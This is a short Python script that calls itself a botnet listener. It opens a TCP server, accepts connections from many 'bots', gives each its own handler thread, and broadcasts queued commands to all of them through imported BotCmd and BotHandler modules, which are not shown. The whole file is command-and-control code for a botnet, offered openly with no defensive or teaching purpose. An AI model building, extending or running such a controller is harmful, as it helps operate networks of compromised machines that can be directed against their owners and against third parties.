#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue

from BotCmd import BotCmd
from BotHandler import BotHandler


q = queue.Queue()
socketThread = []

def listener(lhost, lport, q):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)
    print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")

    # this thread is in charge to send the command to all the bots connected (stored in socket thread)
    BotCmdThread = BotCmd(q,socketThread)
    BotCmdThread.start()

    #this thread is to handle all the bots connection
    while(True):
        (client, clientAddress) = server.accept()
        newThread = BotHandler(client, clientAddress,q)
        socketThread.append(newThread)
        newThread.start()

def main():
    if(len(sys.argv)<3):
        print('[!] Usage: \n[+] python3 ' + sys.argv[0] + ' <LHOST> <LPORT>\n[+] Ex : python3 ' + sys.argv[0] + ' 0.0.0.0 8080\n')
    else:
        try:
            lhost = sys.argv[1]
            lport = int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__ == '__main__':
    main()